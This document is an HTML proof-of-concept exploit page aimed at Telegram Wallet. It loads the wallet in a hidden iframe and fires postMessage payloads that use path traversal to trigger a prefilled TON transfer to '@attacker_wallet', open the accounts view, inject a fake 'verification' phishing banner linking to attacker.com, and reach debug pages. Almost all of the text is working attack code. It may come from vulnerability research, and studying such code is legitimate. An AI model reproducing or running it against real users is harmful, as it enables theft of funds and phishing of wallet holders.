<!DOCTYPE html>
<html>
  <head>
    <title>Telegram Wallet Exploit PoC</title>
  </head>
  <body>
    <h1>Telegram Wallet Exploit Demo</h1>
    <p>This PoC shows how a background attacker page can silently trigger authenticated actions inside Telegram Wallet.</p>

    <!-- Load Telegram Wallet Start Page in Hidden iframe -->
    <iframe id="tg_frame" src="https://t.me/wallet/start" style="display:none;"></iframe>

    <script>
      const payloads = [
        // Prefilled TON transfer to attacker
        "../../../wallet/send?amount=1000000&to=@attacker_wallet",

        // Open accounts view (sensitive info)
        "../../../wallet/accounts",

        // Inject a fake banner with phishing URL
        "../../../wallet/start?banner=verify_phone&title=Update+Required&text=Your+TON+Wallet+must+be+verified.+Click+here+to+secure+it.&url=https://attacker.com",

        // Load TON Space
        "../../../wallet/ton-space",

        // Debug info (for dev interfaces)
        "../../../wallet/debug"
      ];

      let index = 0;

      const sendPayload = () => {
        const testPayload = payloads[index];
        console.log("üöÄ Sending payload:", testPayload);

        const message = JSON.stringify({
          eventType: 'web_app_open_tg_link',
          eventData: {
            path_full: `/wallet/start?x=${encodeURIComponent(testPayload)}`
          }
        });

        const iframe = document.getElementById("tg_frame");

        if (iframe && iframe.contentWindow) {
          iframe.contentWindow.postMessage(message, "*");
        } else {
          console.warn("‚ö†Ô∏è iframe not ready or blocked.");
        }

        index++;
        if (index < payloads.length) {
          setTimeout(sendPayload, 2500); // Wait 2.5s between each
        }
      };

      window.onload = function () {
        const iframe = document.getElementById("tg_frame");

        iframe.onload = function () {
          console.log("‚úÖ iframe loaded");
          sendPayload();
        };

        iframe.onerror = function () {
          console.error("‚ùå iframe failed to load");
        };
      };
    </script>
  </body>
</html>
